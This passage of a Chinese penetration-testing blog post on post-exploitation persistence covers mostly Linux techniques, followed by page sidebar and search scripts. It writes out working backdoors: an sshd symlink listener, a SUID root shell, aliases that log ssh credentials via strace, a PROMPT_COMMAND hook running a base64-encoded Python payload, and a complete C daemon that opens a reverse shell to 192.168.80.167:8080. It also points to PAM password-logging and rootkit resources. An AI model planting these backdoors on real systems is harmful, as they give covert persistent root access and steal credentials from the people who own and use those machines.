+<h2 id="sshd软连接"><a href="#sshd软连接" class="headerlink" title="sshd软连接"></a>sshd软连接</h2><blockquote>
+<p>原理细节： <a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener">http://www.91ri.org/16803.html</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br><span class="line"></span><br><span class="line">attack</span><br><span class="line">ssh root@x.x.x.x -p 5555</span><br></pre></td></tr></table></figure>
+<h2 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h2><p>root 权限下执行如下命令，普通用户运行<code>/dev/.rootshell</code>即可获得root权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /dev/.rootshell</span><br><span class="line">chmod u+s /dev/.rootshell</span><br></pre></td></tr></table></figure></p>
+<h2 id="alias瞒天过海"><a href="#alias瞒天过海" class="headerlink" title="alias瞒天过海"></a>alias瞒天过海</h2><p>我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例：</p>
+<ol>
+<li><p>修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ssh=&apos;strace -o /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log -e read,write,connect  -s2048 ssh&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用守护进程回弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias cat=&apos;cat&amp;&amp;/root/.shell&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>shell.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line"></span><br><span class="line">#define ERR_EXIT(m) \</span><br><span class="line">do\</span><br><span class="line">&#123;\</span><br><span class="line">    perror(m);\</span><br><span class="line">    exit(EXIT_FAILURE);\</span><br><span class="line">&#125;\</span><br><span class="line">while (0);\</span><br><span class="line"></span><br><span class="line">void creat_daemon(void);</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    time_t t;</span><br><span class="line">    int fd;</span><br><span class="line">    creat_daemon();</span><br><span class="line">    system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.80.167/8080 0&gt;&amp;1&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void creat_daemon(void)</span><br><span class="line">&#123;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int devnullfd,fd,fdtablesize;</span><br><span class="line">    umask(0);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    if( pid == -1)</span><br><span class="line">        ERR_EXIT(&quot;fork error&quot;);</span><br><span class="line">    if(pid &gt; 0 )</span><br><span class="line">        exit(EXIT_SUCCESS);</span><br><span class="line">    if(setsid() == -1)</span><br><span class="line">        ERR_EXIT(&quot;SETSID ERROR&quot;);</span><br><span class="line">    chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">    /* close any open file descriptors */</span><br><span class="line">    for(fd = 0, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++)</span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">    devnullfd = open(&quot;/dev/null&quot;, 0);</span><br><span class="line"></span><br><span class="line">    /* make STDIN ,STDOUT and STDERR point to /dev/null */</span><br><span class="line">    if (devnullfd == -1) &#123;</span><br><span class="line">        ERR_EXIT(&quot;can&apos;t open /dev/null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (dup2(devnullfd, STDIN_FILENO) == -1) &#123;</span><br><span class="line">        ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDIN_FILENO&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (dup2(devnullfd, STDOUT_FILENO) == -1) &#123;</span><br><span class="line">        ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDOUT_FILENO&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (dup2(devnullfd, STDERR_FILENO) == -1) &#123;</span><br><span class="line">        ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDOUT_FILENO&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGCHLD,SIG_IGN); </span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/myimages/后门/bashrc.PNG" alt="image"></p>
+<p><img src="/myimages/后门/ncshell.PNG" alt="image"></p>
+<h2 id="linux-PAM密码记录后门"><a href="#linux-PAM密码记录后门" class="headerlink" title="linux PAM密码记录后门"></a>linux PAM密码记录后门</h2><p>pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。</p>
+<blockquote>
+<p><a href="https://blog.51cto.com/redkey/1343316" target="_blank" rel="noopener">https://blog.51cto.com/redkey/1343316</a></p>
+</blockquote>
+<h2 id="PROMPT-COMMAND后门"><a href="#PROMPT-COMMAND后门" class="headerlink" title="PROMPT_COMMAND后门"></a>PROMPT_COMMAND后门</h2><p>bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;exec(&apos;encoded_payload&apos;.decode(&apos;base64&apos;))&quot; 2&gt;/dev/null &amp;)&quot;</span><br></pre></td></tr></table></figure></p>
+<p>当然也可以使用prompt_command进行提权,参考：<a href="https://www.anquanke.com/post/id/155943" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943</a></p>
+<h2 id="ssh免密后门"><a href="#ssh免密后门" class="headerlink" title="ssh免密后门"></a>ssh免密后门</h2><p>把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。</p>
+<h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><p>rootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。</p>
+<blockquote>
+<p>列表：<a href="https://github.com/d30sa1/RootKits-List-Download" target="_blank" rel="noopener">https://github.com/d30sa1/RootKits-List-Download</a></p>
+</blockquote>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1]<a href="https://www.anquanke.com/post/id/155943" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943</a><br>[2]<a href="http://view.inews.qq.com/a/20180820B0WO1Z00" target="_blank" rel="noopener">http://view.inews.qq.com/a/20180820B0WO1Z00</a><br>[3]<a href="https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" target="_blank" rel="noopener">https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a><br>[4]<a href="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/</a><br>[5]<a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a><br>[6]<a href="https://www.secfree.com/a/1049.html" target="_blank" rel="noopener">https://www.secfree.com/a/1049.html</a><br>[7]<a href="http://hebic.me/2018/11/02/Linux-rootkit-%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">http://hebic.me/2018/11/02/Linux-rootkit-%E5%88%9D%E6%8E%A2/</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2019/02/26/权限维持杂谈/">权限维持杂谈</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1ypt0
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2019年02月26日 - 15:02
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2019年02月26日 - 15:02
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://lypto.me/2019/02/26/权限维持杂谈/" title="权限维持杂谈">http://lypto.me/2019/02/26/权限维持杂谈/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/权限维持/" rel="tag"># 权限维持</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/16/日志隐匿/" rel="next" title="日志隐匿">
+                <i class="fa fa-chevron-left"></i> 日志隐匿
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
+          <p class="site-author-name" itemprop="name">1ypt0</p>
+           
+              <p class="site-description motion-element" itemprop="description">Please remember that. The Titanic was not supposed to sink, but it did.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">44</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://cesslab.club/#/" title="cesslab" target="_blank">cesslab</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://firmianay.github.io/" title="超哥" target="_blank">超哥</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nen9ma0.github.io/" title="大能猫" target="_blank">大能猫</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://dimo233.github.io/" title="去师" target="_blank">去师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.k0rz3n.com" title="天师" target="_blank">天师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://notwo1f.github.io/" title="武师" target="_blank">武师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://1phan.cc/" title="1phan" target="_blank">1phan</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sky3.pw/" title="sky" target="_blank">sky</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lookupes.com/" title="lookup" target="_blank">lookup</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://herbwen.com/" title="文师" target="_blank">文师</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-MSF"><span class="nav-number">1.</span> <span class="nav-text">0x01 MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#persistence"><span class="nav-number">1.1.</span> <span class="nav-text">persistence</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metsvc"><span class="nav-number">1.2.</span> <span class="nav-text">Metsvc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scheduleme-amp-Schtasksabuse"><span class="nav-number">1.3.</span> <span class="nav-text">Scheduleme &amp; Schtasksabuse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mof-ps-persist"><span class="nav-number">1.4.</span> <span class="nav-text">Mof_ps_persist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Autorunscript"><span class="nav-number">1.5.</span> <span class="nav-text">Autorunscript</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-计划任务"><span class="nav-number">2.</span> <span class="nav-text">0x02 计划任务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows"><span class="nav-number">2.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux"><span class="nav-number">2.2.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#at"><span class="nav-number">2.2.1.</span> <span class="nav-text">at</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab"><span class="nav-number">2.2.2.</span> <span class="nav-text">crontab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#anacron"><span class="nav-number">2.2.3.</span> <span class="nav-text">anacron</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-windows权限维持"><span class="nav-number">3.</span> <span class="nav-text">0x03 windows权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#影子账户"><span class="nav-number">3.1.</span> <span class="nav-text">影子账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerShell后门"><span class="nav-number">3.2.</span> <span class="nav-text">PowerShell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Empire框架"><span class="nav-number">3.2.1.</span> <span class="nav-text">Empire框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Schtasks-Backdoor"><span class="nav-number">3.2.2.</span> <span class="nav-text">Schtasks-Backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf"><span class="nav-number">3.2.3.</span> <span class="nav-text">msf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表开机启动"><span class="nav-number">3.3.</span> <span class="nav-text">注册表开机启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#映像劫持"><span class="nav-number">3.4.</span> <span class="nav-text">映像劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shift后门"><span class="nav-number">3.5.</span> <span class="nav-text">shift后门</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-linux权限维持"><span class="nav-number">4.</span> <span class="nav-text">0x04 linux权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sshd软连接"><span class="nav-number">4.1.</span> <span class="nav-text">sshd软连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID-Shell"><span class="nav-number">4.2.</span> <span class="nav-text">SUID Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias瞒天过海"><span class="nav-number">4.3.</span> <span class="nav-text">alias瞒天过海</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-PAM密码记录后门"><span class="nav-number">4.4.</span> <span class="nav-text">linux PAM密码记录后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PROMPT-COMMAND后门"><span class="nav-number">4.5.</span> <span class="nav-text">PROMPT_COMMAND后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh免密后门"><span class="nav-number">4.6.</span> <span class="nav-text">ssh免密后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rootkit"><span class="nav-number">4.7.</span> <span class="nav-text">rootkit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">5.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1ypt0</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://lypto.me/2019/02/26/权限维持杂谈/';
+          this.page.identifier = '2019/02/26/权限维持杂谈/';
+          this.page.title = '权限维持杂谈';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
